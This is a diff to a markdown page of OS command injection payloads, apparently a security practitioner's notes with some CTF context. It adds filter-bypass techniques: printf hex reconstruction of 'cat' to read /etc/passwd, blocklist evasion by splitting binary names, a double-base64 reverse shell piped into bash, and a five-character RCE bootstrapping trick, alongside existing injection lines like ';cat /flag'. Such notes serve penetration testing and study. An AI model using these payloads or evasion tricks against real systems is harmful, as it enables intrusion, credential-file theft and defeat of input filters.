@@ -2,7 +2,7 @@
 title: "Payloads: OS Command Injection"
 type: payloads
 tags: [payloads, command-injection, rce, web]
-sources: []
+sources: [hacktricks-linux]
 date_created: 2026-06-16
 date_updated: 2026-06-30
 ---
@@ -100,3 +100,26 @@ ping -c1 127.0.0.1;cat /flag           # any allowed word as the prefix, then ; 
 file -- -oG /tmp/x          # option injection
 LD_PRELOAD / wildcard: tar cf x * -> --checkpoint-action=exec
 ```
+
+## Advanced filter bypass: builtins-only, char reconstruction, 5-char RCE
+When `PATH` is stripped or external binaries are blocked, fall back to shell builtins and reconstruct
+characters instead of typing forbidden ones.
+```bash
+compgen -b                                    # list builtins
+PATH=$(echo /usr/bin); echo $PATH             # or: declare -x PATH=/bin
+printf %s "${PATH:0:1}"                        # extract "/" from an env var without typing it
+$(printf '\x63\x61\x74') /etc/passwd          # reconstruct "cat" via octal/hex printf
+```
+Word/path filters: split binary names so blocklists miss them, using shell features the parser
+resolves before exec: quotes/backslashes inside the name (`c""at`, `w\ho\am\i`), wildcard/`?`
+substitution against `/bin`, `$@`/`$0`, uninitialized-variable insertion (`cat$u /etc/passwd`),
+case/reverse/base64 transforms, and history-expansion string building. Double-base64 a reverse shell
+to dodge bad chars entirely:
+```bash
+echo${IFS}<b64b64>|ba''se''64${IFS}-''d|base64${IFS}-d|bash
+```
+When only a handful of characters pass a regex, the Orange Tsai BabyFirst 5-char RCE bootstraps: use
+`ls -t>g` filename-ordering tricks to assemble longer commands into a file, then execute it,
+escalating a tiny character set into full command execution. Also test newline injection against
+regexes that only match `[a-zA-Z0-9]` on a single line. Bashfuscator can generate obfuscated
+equivalents when hand-crafting stalls.
